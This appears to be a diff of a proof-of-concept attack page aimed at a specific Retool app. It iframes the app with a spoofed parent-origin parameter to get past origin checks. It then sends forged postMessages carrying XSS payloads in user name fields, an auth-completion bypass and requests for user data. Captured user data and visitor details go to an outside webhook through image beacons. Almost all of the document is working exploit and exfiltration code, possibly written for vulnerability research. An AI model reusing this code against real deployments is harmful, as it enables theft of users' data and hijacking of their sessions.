@@ -21,6 +21,9 @@
   <p id="sub">Please wait</p>
 </div>
 
+<!-- Hidden iframe to load the retool app with retool-parent-origin bypass -->
+<iframe id="f" style="display:none;" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+
 <script>
 (function() {
   'use strict';
@@ -30,9 +33,9 @@
   var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
   var HOST = 'https://jonjos11.retool.com';
 
-  // Target URLs to open
-  var EDITOR_URL = HOST + '/apps/' + APP_ID + '/editor';
-  var RUNTIME_BASE = 'https://retool-edge.com/runtime.M2M3OWU5.html';
+  // Build the retool app URL with retool-parent-origin set to OUR origin
+  // This bypasses the origin check at retol.js lines 548,801,1780,2036,2147,7133,7795
+  var APP_URL = HOST + '/apps/' + APP_ID + '/asa/defaultPage?retool-parent-origin=' + encodeURIComponent(ATK);
 
   function X(payload) {
     var j = JSON.stringify(payload);
@@ -41,114 +44,188 @@
     new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0,800));
   }
 
-  // ==============================================================
-  // STRATEGY A: Open the REAL editor via window.open()
-  // The editor loads the runtime internally. We listen for ANY
-  // postMessages from the editor window (which may include forwarded
-  // runtime messages or editor messages sent to opener via '*')
-  // ==============================================================
-  function attackRealEditor() {
-    var popup = window.open(EDITOR_URL, 're', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));
+  function log(m) { console.log('[PoC]', m); }
+
+  // ================================================================
+  // ATTACK 1: Iframe the retool app with retool-parent-origin bypass
+  // No X-Frame-Options on jonjos11.retool.com → app can be iframed!
+  // retool-parent-origin makes the editor accept OUR postMessages.
+  // ================================================================
+  function iframeRetoolApp() {
+    var f = document.getElementById('f');
+    f.src = APP_URL;
+
+    f.onload = function() {
+      log('Retool app loaded in iframe');
+      X({ event: 'app_iframe_loaded', url: APP_URL, time: new Date().toISOString() });
+
+      // After app loads, send RETOOL_CURRENT_USER_REQUEST to the editor.
+      // The editor receives it and may respond with REAL user data.
+      // We use postMessage with targetOrigin '*' since we bypassed origin check.
+      setTimeout(function() {
+        log('Requesting real user data from editor...');
+        try {
+          f.contentWindow.postMessage(
+            { type: 'RETOOL_CURRENT_USER_REQUEST' },
+            '*'
+          );
+          X({ event: 'sent_user_request', to: 'editor', time: new Date().toISOString() });
+        } catch(e) {
+          log('Error sending: ' + e.message);
+          X({ event: 'send_error', error: e.message });
+        }
+      }, 3000);
+
+      // Also try sending to any nested iframes (the runtime inside the editor)
+      // We can iterate through the iframe's frames if same-origin, but
+      // cross-origin we can't. Instead, we try postMessage to the iframe
+      // which might be forwarded by the editor to the runtime.
+
+      // Send XSS probes via RETOOL_CURRENT_USER (handler at retol.js:7043 has NO origin check)
+      // If the runtime receives this and renders user data unsafely, XSS fires
+      setTimeout(function() {
+        var xssUser = {
+          id: 999,
+          email: 'xss-probe@test.com',
+          firstName: '<img src=x onerror="window.top.postMessage({type:\'XSS_FIRED\',loc:1},\'*\')">',
+          lastName: '<svg onload="window.top.postMessage({type:\'XSS_FIRED\',loc:2},\'*\')">',
+          fullName: '<img src=x onerror="window.top.postMessage({type:\'XSS_FIRED\',loc:3},\'*\')">',
+          profilePhotoUrl: 'javascript:void(0)',
+          groups: [{ id: 1, name: 'admin' }],
+          metadata: { role: 'superadmin', _xss_probe: true },
+          sid: 'xss-probe-' + Date.now(),
+          externalIdentifier: null,
+          locale: 'en'
+        };
+
+        try {
+          f.contentWindow.postMessage(
+            { type: 'RETOOL_CURRENT_USER', data: xssUser },
+            '*'
+          );
+          X({ event: 'xss_probe_sent', via: 'RETOOL_CURRENT_USER', time: new Date().toISOString() });
+        } catch(e) {}
+      }, 5000);
+
+      // Send auth bypass (handler at retol.js:7751 has NO origin check)
+      setTimeout(function() {
+        try {
+          f.contentWindow.postMessage(
+            { type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' },
+            '*'
+          );
+          X({ event: 'auth_bypass_sent', time: new Date().toISOString() });
+        } catch(e) {}
+      }, 4000);
+    };
+
+    f.onerror = function() {
+      log('Failed to load iframe (X-Frame-Options may block)');
+      X({ event: 'iframe_blocked', url: APP_URL, time: new Date().toISOString() });
+      useWindowOpenFallback();
+    };
+  }
+
+  // ================================================================
+  // ATTACK 2: Fallback - window.open() the editor
+  // ================================================================
+  function useWindowOpenFallback() {
+    document.getElementById('msg').textContent = 'Iframe blocked, trying popup...';
+
+    var url = HOST + '/apps/' + APP_ID + '/editor?retool-parent-origin=' + encodeURIComponent(ATK);
+    var popup = window.open(url, 're', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));
 
     if (!popup) {
-      document.getElementById('msg').textContent = 'Popup blocked';
-      document.getElementById('sub').textContent = 'Allow popups and reload';
+      log('Popup blocked too');
+      document.getElementById('msg').textContent = 'Allow popups';
+      document.getElementById('sub').textContent = 'Both iframe and popup blocked';
       document.getElementById('spin').style.display = 'none';
       return;
     }
 
-    document.getElementById('msg').textContent = 'Connected to editor';
-    document.getElementById('sub').textContent = 'Listening for messages...';
+    log('Editor opened via popup: ' + url);
+    X({ event: 'popup_opened', url: url, time: new Date().toISOString() });
 
-    X({ event: 'editor_opened', url: EDITOR_URL, time: new Date().toISOString() });
-
-    // Send probe messages to the editor window (may reach runtime if editor forwards)
-    // The runtime has NO origin check on handlers 7043, 6800, 7751
-    // If the editor forwards our postMessages to the runtime, the runtime accepts them
-    setTimeout(function() {
-      // Request real user data
-      popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
-      X({ event: 'sent_probe', to: 'editor', type: 'RETOOL_CURRENT_USER_REQUEST', time: new Date().toISOString() });
-    }, 3000);
-
-    setInterval(function() {
-      if (popup.closed) return;
-      popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
-    }, 5000);
-
-    // Monitor popup
-    setInterval(function() {
+    var attempts = 0;
+    var interval = setInterval(function() {
       if (popup.closed) {
-        document.getElementById('msg').textContent = 'Window closed';
-        document.getElementById('sub').textContent = 'Check webhook for captured data';
+        clearInterval(interval);
+        log('Popup closed');
+        document.getElementById('msg').textContent = 'Done';
+        document.getElementById('sub').textContent = 'Check webhook for results';
         document.getElementById('spin').style.display = 'none';
+        return;
       }
-    }, 1000);
-  }
-
-  // ==============================================================
-  // STRATEGY B: Iframe the runtime with real parentOrigin
-  // The runtime sends messages to US (its parent). Since handlers
-  // at 7043/6800/7751 have NO origin check, we can also send
-  // messages to it. We try to trigger backend calls to capture
-  // real function names + params.
-  // ==============================================================
-  function attackRuntime() {
-    // Use the REAL editor as parentOrigin so runtime might load real app
-    var url = RUNTIME_BASE + '?parentOrigin=' + encodeURIComponent(HOST) + '&product=retool-web&isTestRuntime=false';
-
-    var f = document.createElement('iframe');
-    f.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;';
-    f.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation';
-    f.src = url;
-    document.body.appendChild(f);
-
-    f.onload = function() {
-      X({ event: 'runtime_loaded', url: url, time: new Date().toISOString() });
-
-      // DON'T inject fake user — let the runtime wait for real data
-      // But DO send auth bypass (no origin check at handler 7751)
+      attempts++;
       try {
-        f.contentWindow.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
+        popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
       } catch(e) {}
-    };
+    }, 2000);
+
+    setTimeout(function() {
+      clearInterval(interval);
+      if (!popup.closed) popup.close();
+    }, 60000);
   }
 
-  // ==============================================================
+  // ================================================================
   // INTERCEPT ALL postMessages
-  // ==============================================================
+  // Listen for: RETOOL_CURRENT_USER (real user data!),
+  // RETOOL_BACKEND_FUNCTION, XSS_FIRED, and any other RETOOL_ messages
+  // ================================================================
   window.addEventListener('message', function(e) {
     var d = e.data;
     if (!d || typeof d !== 'object' || !d.type) return;
 
-    // Log ALL postMessages regardless of source (capture everything)
+    if (d.type === 'XSS_FIRED') {
+      log('XSS FIRED! Location: ' + (d.loc || 'unknown'));
+      X({ event: 'xss_confirmed', location: d.loc, origin: e.origin, time: new Date().toISOString() });
+      document.getElementById('msg').textContent = 'XSS Confirmed!';
+      document.getElementById('sub').textContent = 'Check webhook for details';
+      document.getElementById('spin').style.display = 'none';
+      return;
+    }
+
     if (d.type && d.type.indexOf('RETOOL_') === 0) {
+      log('INTERCEPT: ' + d.type + ' from ' + e.origin);
+
+      // If this is RETOOL_CURRENT_USER — it contains REAL user data!
+      if (d.type === 'RETOOL_CURRENT_USER') {
+        log('*** REAL USER DATA CAPTURED! ***');
+        document.getElementById('msg').textContent = 'Real user data captured!';
+        document.getElementById('sub').textContent = (d.data && (d.data.email || d.data.fullName)) || 'Check webhook';
+        document.getElementById('spin').style.display = 'none';
+      }
+
       X({
         event: 'intercept',
         type: d.type,
         data: d,
         origin: e.origin,
-        source: e.source === window ? 'self' : (e.source === window.opener ? 'opener' : 'other'),
         time: new Date().toISOString()
       });
     }
   });
 
-  // ==============================================================
-  // AUTO-START on click (bypass popup blocker)
-  // ==============================================================
+  // ================================================================
+  // START — on user click
+  // ================================================================
+  document.getElementById('msg').textContent = 'Ready';
+  document.getElementById('sub').textContent = 'Click anywhere to begin';
+  document.getElementById('spin').style.display = 'none';
+
   document.body.addEventListener('click', function go() {
     document.body.removeEventListener('click', go);
+    document.getElementById('msg').textContent = 'Attacking...';
+    document.getElementById('sub').textContent = 'Iframing retool app with origin bypass';
+    document.getElementById('spin').style.display = 'block';
 
-    X({ event: 'attack_start', attackerOrigin: ATK, editorUrl: EDITOR_URL, runtimeUrl: RUNTIME_BASE, time: new Date().toISOString() });
+    X({ event: 'attack_start', attacker: ATK, host: HOST, appId: APP_ID, url: APP_URL, time: new Date().toISOString() });
 
-    // Open the REAL editor (Strategy A)
-    attackRealEditor();
-
-    // Also iframe the runtime (Strategy B)
-    attackRuntime();
+    iframeRetoolApp();
   });
 
+  // Exfiltrate page load info
   X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });
 
 })();
